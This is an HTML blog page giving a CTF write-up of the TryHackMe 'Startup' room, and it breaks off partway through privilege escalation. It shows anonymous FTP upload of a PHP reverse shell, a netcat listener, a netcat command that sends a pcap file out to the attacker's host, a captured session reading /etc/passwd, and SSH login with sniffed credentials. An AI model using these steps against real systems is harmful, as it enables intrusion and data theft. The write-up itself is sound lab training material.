@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Startup Write Up</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Infosec | Hacking | CTF" />
+    <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
+    <link rel="canonical" href="https://darrynbrownfield.co.uk/Startup" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Darryn Brownfield" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Startup Write Up" />
+    <meta property="og:description" content="Overview Startup is an fun easy room from TryHackMe. Credit to r1gormort1s for a great room. We have three tasks to complete, finding both the user and root flag and the secret ingredient in the spicy soup recipe. The description of the room is: We are Spice Hut, a new" />
+    <meta property="og:url" content="https://darrynbrownfield.co.uk/Startup" />
+    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/startup/cover.jpg" />
+    <meta property="article:publisher" content="https://www.facebook.com/" />
+    <meta property="article:author" content="https://www.facebook.com/" />
+    <meta property="article:published_time" content="2020-11-21T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2020-11-21T00:00:00+00:00" />
+    <meta property="article:tag" content="Tryhackme" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Startup Write Up" />
+    <meta name="twitter:description" content="Overview Startup is an fun easy room from TryHackMe. Credit to r1gormort1s for a great room. We have three tasks to complete, finding both the user and root flag and the secret ingredient in the spicy soup recipe. The description of the room is: We are Spice Hut, a new" />
+    <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
+    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/startup/cover.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Darryn Brownfield" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Tryhackme" />
+    <meta name="twitter:site" content="@dazbrownfield" />
+    <meta name="twitter:creator" content="@dazbrownfield" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Darryn Brownfield",
+        "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
+    },
+    "url": "https://darrynbrownfield.co.uk/Startup",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://darrynbrownfield.co.uk/assets/images/startup/cover.jpg",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://darrynbrownfield.co.uk/Startup"
+    },
+    "description": "Overview Startup is an fun easy room from TryHackMe. Credit to r1gormort1s for a great room. We have three tasks to complete, finding both the user and root flag and the secret ingredient in the spicy soup recipe. The description of the room is: We are Spice Hut, a new"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Startup Write Up" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            <a
+              class="social-link social-link-tw"
+              href="https://github.com/darrynb89"
+              target="_blank"
+              rel="noopener"
+              ><svg
+  version="1.0"
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 120.000000 120.000000"
+>
+  <g
+    transform="translate(0.000000,120.000000) scale(0.0900000,-0.0900000)"
+    fill="#ffffff"
+    stroke="none"
+  >
+    <path
+      d="M441 1174 c-105 -28 -181 -73 -266 -159 -125 -124 -175 -246 -175
+-425 0 -179 50 -300 175 -425 85 -85 185 -145 243 -145 36 0 42 13 42 89 l0
+57 -57 -3 c-74 -5 -117 17 -150 78 -13 24 -37 56 -54 71 -34 33 -36 38 -9 38
+12 0 20 -7 20 -16 0 -10 6 -14 14 -11 10 4 13 1 9 -9 -3 -10 2 -14 18 -14 18
+0 20 -3 10 -9 -16 -11 -4 -34 14 -27 9 3 11 -2 7 -16 -4 -18 -2 -20 21 -14 20
+5 25 3 21 -8 -9 -23 17 -31 33 -11 12 17 13 17 13 2 0 -11 8 -17 21 -17 15 0
+19 5 15 15 -3 8 -1 15 4 15 6 0 10 -7 10 -15 0 -8 7 -15 15 -15 8 0 15 8 15
+18 0 10 10 39 23 64 l23 46 -59 13 c-136 28 -210 123 -211 268 -1 66 3 82 27
+124 23 39 27 55 22 86 -7 40 9 121 24 121 18 0 78 -25 113 -46 30 -19 42 -22
+70 -14 18 6 71 10 118 10 47 0 100 -4 118 -10 28 -8 40 -5 70 14 35 21 95 46
+113 46 15 0 31 -81 24 -121 -5 -31 -1 -47 22 -86 24 -42 28 -58 27 -123 -1
+-147 -65 -231 -203 -266 l-68 -18 18 -30 c15 -25 19 -51 19 -138 0 -58 3 -113
+6 -122 20 -52 166 16 279 129 125 125 175 246 175 425 0 179 -50 301 -175 425
+-86 87 -161 131 -270 160 -75 19 -241 19 -314 -1z"
+    />
+  </g>
+</svg></a
+            >
+            
+            <a
+              class="social-link social-link-li"
+              href="https://www.linkedin.com/in/darryn-brownfield-0b1132b5"
+              target="_blank"
+              rel="noopener"
+              ><svg viewBox="0 50 512 512">
+    <g transform="translate(0.000000,20.000000) scale(1.1)">
+      <path
+        d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
+      C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
+      M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
+      c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
+      s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"
+      />
+    </g>
+  </svg></a
+            >
+             
+            <a
+              class="social-link social-link-tw"
+              href="https://twitter.com/dazbrownfield"
+              target="_blank"
+              rel="noopener"
+              ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a
+            >
+             
+          </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-tryhackme tag-ctf tag-easy post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="21 November 2020">21 November 2020</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/tryhackme/'>TRYHACKME</a>,
+                            
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>,
+                            
+                        
+                            
+                               <a href='/tag/easy/'>EASY</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Startup Write Up</h1>
+            </header>
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <p><img src="/assets/images/startup/cover.jpg" alt="Startup" /></p>
+
+<h3 id="overview">Overview</h3>
+
+<p><a href="https://tryhackme.com/room/startup">Startup</a> is an fun easy room from <a href="https://tryhackme.com">TryHackMe</a>. Credit to <a href="https://twitter.com/elbee_ez">r1gormort1s</a> for a great room.  We have three tasks to complete, finding both the user and root flag and the secret ingredient in the spicy soup recipe.</p>
+
+<p>The description of the room is:</p>
+
+<p><em>We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (incase you get hungry), but that is not why you are here. To be truthful, we aren’t sure if our developers know what they are doing and our security concerns are rising. We ask that you preform a thorough penetration test and try to own root. Good luck!</em></p>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $sudo nmap -sC -sV -oN nmap/initial startup
+[sudo] password for daz: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-21 11:01 GMT
+Nmap scan report for startup (10.10.27.29)
+Host is up (0.026s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
+| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
+|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to (VPN IP)
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
+|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
+|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Maintenance
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds
+</code></pre>
+
+<p>3 Ports open:</p>
+
+<ul>
+  <li>21 - FTP - Anonymous login allowed which is interesting will need to check what files and access is available</li>
+  <li>22 - SSH - Banner is showing its an Ubuntu machine</li>
+  <li>80 - HTTP - Apache web server</li>
+</ul>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Starting with FTP (port 21) I logged in using anonymous as the username and password.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]                       
+└──╼ $ftp startup                                                    
+Connected to startup.                                                
+220 (vsFTPd 3.0.3)                                                   
+Name (startup:daz): anonymous                                        
+331 Please specify the password.                                     
+Password:                                                            
+230 Login successful.                                                
+Remote system type is UNIX.                                          
+Using binary mode to transfer files.
+ftp&gt; ls 
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp
+-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
+-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
+226 Directory send OK.
+ftp&gt; cd ftp
+250 Directory successfully changed.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp&gt; ls -lah
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 .
+drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
+226 Directory send OK.
+ftp&gt; get important.jpg 
+local: important.jpg remote: important.jpg
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for important.jpg (251631 bytes)
+226 Transfer complete.
+251631 bytes received in 0.10 secs (2.3400 MB/s)
+ftp&gt; get notice.txt 
+local: notice.txt remote: notice.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for notice.txt (208 bytes).
+226 Transfer complete.
+208 bytes received in 0.00 secs (4.1326 MB/s)
+ftp&gt; 
+</code></pre>
+
+<p>A few files are available including a txt file stating someone is uploading Among Us memes. (I know nothing about Among Us but my kids say its good….. I prefer Assassins Creed!). We do have a possible username of Maya.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $cat notice.txt 
+Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is
+, but Maya is looking pretty sus.
+</code></pre>
+
+<p>But nothing else out of interest. So I turned my attention to HTTP (port 80).</p>
+
+<p><img src="/assets/images/startup/index.png" alt="index" /></p>
+
+<p>A very simple webpage and nothing really to note in the source.  So I ran a gobuster to check for other directories.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $gobuster dir -u http://startup -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt,html
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://startup
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt,html
+[+] Timeout:        10s
+===============================================================
+2020/11/21 11:12:05 Starting gobuster
+===============================================================
+/files (Status: 301)
+/index.html (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2020/11/21 11:22:32 Finished
+===============================================================
+</code></pre>
+
+<p>‘/files’ looks interesting.</p>
+
+<p><img src="/assets/images/startup/files.png" alt="files" /></p>
+
+<p>This mirrors the files seen on the FTP service, so my first thought is to see if we can upload a reverse shell script via ftp and execute via the web.</p>
+
+<h3 id="initial-access">Initial Access</h3>
+
+<p>The first step is to copy a web shell script in to our working directory.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php 
+┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $mv php-reverse-shell.php shell.php
+┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $
+</code></pre>
+
+<p>I edited the script with my vpn IP and changed the port to 4444.</p>
+
+<pre><code class="language-highlight">set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+</code></pre>
+
+<p>Next I uploaded the script via ftp.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $ftp startup
+Connected to startup.
+220 (vsFTPd 3.0.3)
+Name (startup:daz): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; put shell.php 
+local: shell.php remote: shell.php
+200 PORT command successful. Consider using PASV.
+553 Could not create file.
+ftp&gt; cd ftp
+250 Directory successfully changed.
+ftp&gt; put shell.php
+local: shell.php remote: shell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5493 bytes sent in 0.00 secs (168.9849 MB/s)
+ftp&gt; exit
+221 Goodbye.
+</code></pre>
+
+<p>I was unable to add to the initial directory however once I changed to the ‘ftp’ directory I was able to successfully upload the web shell script. Now I just need to navigate to the file in my browser.</p>
+
+<p><img src="/assets/images/startup/webshell.png" alt="webshell" /></p>
+
+<p>We have a shell!</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [(VPN IP)] from (UNKNOWN) [10.10.27.29] 48764
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 11:29:08 up 31 min,  0 users,  load average: 0.00, 1.01, 1.27
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</code></pre>
+
+<p>We only have a limited shell as www-data so the next step is to enumerate the system to escalate privileges.</p>
+
+<pre><code class="language-highlight">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ ls -lah
+total 100K
+drwxr-xr-x  25 root     root     4.0K Nov 21 10:58 .
+drwxr-xr-x  25 root     root     4.0K Nov 21 10:58 ..
+drwxr-xr-x   2 root     root     4.0K Sep 25 08:12 bin
+drwxr-xr-x   3 root     root     4.0K Sep 25 08:12 boot
+drwxr-xr-x  16 root     root     3.5K Nov 21 10:58 dev
+drwxr-xr-x  96 root     root     4.0K Nov 12 05:08 etc
+drwxr-xr-x   3 root     root     4.0K Nov 12 04:53 home
+drwxr-xr-x   2 www-data www-data 4.0K Nov 12 04:53 incidents
+lrwxrwxrwx   1 root     root       33 Sep 25 08:12 initrd.img -&gt; boot/initrd.img-4.4.0-190-generic
+lrwxrwxrwx   1 root     root       33 Sep 25 08:12 initrd.img.old -&gt; boot/initrd.img-4.4.0-190-generic
+drwxr-xr-x  22 root     root     4.0K Sep 25 08:22 lib
+drwxr-xr-x   2 root     root     4.0K Sep 25 08:10 lib64
+drwx------   2 root     root      16K Sep 25 08:12 lost+found
+drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 media
+drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 mnt
+drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 opt
+dr-xr-xr-x 127 root     root        0 Nov 21 10:57 proc
+-rw-r--r--   1 www-data www-data  136 Nov 12 04:53 recipe.txt
+drwx------   4 root     root     4.0K Nov 12 04:54 root
+drwxr-xr-x  25 root     root      920 Nov 21 11:20 run
+drwxr-xr-x   2 root     root     4.0K Sep 25 08:22 sbin
+drwxr-xr-x   2 root     root     4.0K Nov 12 04:50 snap
+drwxr-xr-x   3 root     root     4.0K Nov 12 04:52 srv
+dr-xr-xr-x  13 root     root        0 Nov 21 11:31 sys
+drwxrwxrwt   7 root     root     4.0K Nov 21 11:31 tmp
+drwxr-xr-x  10 root     root     4.0K Sep 25 08:09 usr
+drwxr-xr-x   2 root     root     4.0K Nov 12 04:50 vagrant
+drwxr-xr-x  14 root     root     4.0K Nov 12 04:52 var
+lrwxrwxrwx   1 root     root       30 Sep 25 08:12 vmlinuz -&gt; boot/vmlinuz-4.4.0-190-generic
+lrwxrwxrwx   1 root     root       30 Sep 25 08:12 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-190-generic
+$ 
+</code></pre>
+
+<p>As www-data we own a folder and a txt file. I checked the incidents folder and found a pcapng file, I used netcat to transfer the file to my machine so I could review in Wireshark.</p>
+
+<p>On my machine:</p>
+
+<pre><code class="language-highlight">┌──[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $nc -nvlp 8080 &gt; catch.pcapng
+listening on [any] 8080 ...
+</code></pre>
+
+<p>Back on Startup:</p>
+
+<pre><code class="language-highlight">$ cd incidents
+$ ls
+suspicious.pcapng
+$ nc [VPN IP] 8080 &lt; suspicious.pcapng
+</code></pre>
+
+<p>Opening the file in Wireshark allows us to review the packet capture and review the captured incident.</p>
+
+<p><img src="/assets/images/startup/wireshark.png" alt="wireshark" /></p>
+
+<p>Scanning through it appears someone has completed the same steps I have by uploading a web shell and navigating to the directory via port 80 and executed the reverse shell. After the GET request I can see TCP packets on port 4444. Right click on one of the packets and select Follow &gt; TCP Stream. This will show the entire TCP stream and all the commands and responses between the attacker and the server.</p>
+
+<pre><code class="language-highlight">Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+bin
+boot
+data
+dev
+etc
+home
+incidents
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+recipe.txt
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+vagrant
+var
+vmlinuz
+vmlinuz.old
+$ ls -la
+total 96
+drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
+drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
+drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
+drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
+drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
+drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
+drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
+drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
+drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
+lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -&gt; boot/initrd.img-4.4.0-190-generic
+lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -&gt; boot/initrd.img-4.4.0-190-generic
+drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
+drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
+drwx------   2 root     root     16384 Sep 25 08:12 lost+found
+drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
+drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
+drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
+dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
+-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
+drwx------   3 root     root      4096 Oct  2 17:24 root
+drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
+drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
+drwxr-xr-x   2 root     root      4096 Oct  2 17:20 snap
+drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
+dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
+drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
+drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
+drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
+drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
+lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -&gt; boot/vmlinuz-4.4.0-190-generic
+lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-190-generic
+$ whoami
+www-data
+$ python -c "import pty;pty.spawn('/bin/bash')"
+www-data@startup:/$ cd
+cd
+bash: cd: HOME not set
+www-data@startup:/$ ls
+ls
+bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
+boot  home	  lib		  mnt	 root	     srv   vagrant
+data  incidents   lib64		  opt	 run	     sys   var
+dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
+www-data@startup:/$ cd home
+cd home
+www-data@startup:/home$ cd lennie
+cd lennie
+bash: cd: lennie: Permission denied
+www-data@startup:/home$ ls
+ls
+lennie
+www-data@startup:/home$ cd lennie
+cd lennie
+bash: cd: lennie: Permission denied
+www-data@startup:/home$ sudo -l
+sudo -l
+[sudo] password for www-data: [redacted]]
+
+Sorry, try again.
+[sudo] password for www-data: 
+
+Sorry, try again.
+[sudo] password for www-data: [redacted]]
+
+sudo: 3 incorrect password attempts
+www-data@startup:/home$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
+ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
+lennie:x:1002:1002::/home/lennie:
+ftpsecure:x:1003:1003::/home/ftpsecure:
+www-data@startup:/home$ exit
+exit
+exit
+$ exit
+</code></pre>
+
+<p>I have redacted the output to hide the password however its clearly visible in the output in the Wireshark capture. Im going to assume the user has not changed their password and try to login in using SSH with the capture credentials.</p>
+
+<h3 id="priv-esc">Priv Esc</h3>
+
+<p>SSH works as expected as the user ‘lennie’. Logging in I can now grab the first flag user.txt.</p>
+
+<p>To complete this room we need to escalate our privileges to root to grab the final flag. In the users home directly are two folders ‘Documents’ and ‘scripts’.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $ssh lennie@startup
+lennie@startup's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+44 packages can be updated.
+30 updates are security updates.
+
+
+Last login: Sat Nov 21 12:01:37 2020 from 10.8.21.217
+$ bash
+lennie@startup:~$ ls -alh
+total 24K
